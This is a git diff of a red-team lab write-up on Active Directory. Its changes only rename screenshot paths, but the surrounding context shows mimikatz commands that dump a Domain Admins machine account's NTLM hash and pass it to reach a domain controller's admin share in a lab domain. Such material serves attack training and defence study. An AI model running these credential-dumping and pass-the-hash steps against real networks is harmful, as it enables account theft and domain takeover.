@@ -14,7 +14,7 @@ Get-ADComputer -Filter * -Properties MemberOf | ? {$_.MemberOf}
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2018-12-29 16-03-19.png>)
+![](../../.gitbook/assets/screenshot-from-2018-12-29-16-03-19.png)
 
 Of course, the same can be observed by simply checking the Domain Admins net group:
 
@@ -24,7 +24,7 @@ net group "domain admins" /domain
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2018-12-29 17-22-59.png>)
+![](../../.gitbook/assets/screenshot-from-2018-12-29-17-22-59.png)
 
 or administrators group (not applicable to our lab, but showing as a sidenote):
 
@@ -34,11 +34,11 @@ net localgroup administrators /domain
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2018-12-29 17-24-07.png>)
+![](../../.gitbook/assets/screenshot-from-2018-12-29-17-24-07.png)
 
 In AD, the highlighted part can be seen here:
 
-![](<../../.gitbook/assets/Screenshot from 2018-12-29 16-36-17.png>)
+![](../../.gitbook/assets/screenshot-from-2018-12-29-16-36-17.png)
 
 Extracting the machine `WS01$` NTLM hash after the admin privileges were gained on the system:
 
@@ -48,11 +48,11 @@ sekurlsa::logonPasswords
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2018-12-29 15-29-17.png>)
+![](../../.gitbook/assets/screenshot-from-2018-12-29-15-29-17.png)
 
 Let's check that our current compromised user `ws01\mantvydas` (local admin on ws01) cannot access the domain controller DC01 just yet:
 
-![](<../../.gitbook/assets/Screenshot from 2018-12-29 15-47-10.png>)
+![](../../.gitbook/assets/screenshot-from-2018-12-29-15-47-10.png)
 
 Since WS01$ machine is a member of `Domain Admins` and we have extracted the machine's hash with mimikatz, we can use mimikatz to pass that hash and effectively elevate our access to Domain Admin:
 
@@ -62,11 +62,11 @@ sekurlsa::pth /user:ws01$ /domain:offense.local /ntlm:ab53503b0f35c9883ff89b7552
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2018-12-29 15-52-35.png>)
+![](../../.gitbook/assets/screenshot-from-2018-12-29-15-52-35.png)
 
 Below shows how the machine's hash is passed which results in an elevated cmd.exe prompt. Using the elevated prompt enables us to access the domain controller as shown with `dir \\dc01\c$`:
 
-![](<../../.gitbook/assets/Peek 2018-12-29 15-49.gif>)
+![](../../.gitbook/assets/peek-2018-12-29-15-49.gif)
 
 ## Remember
 
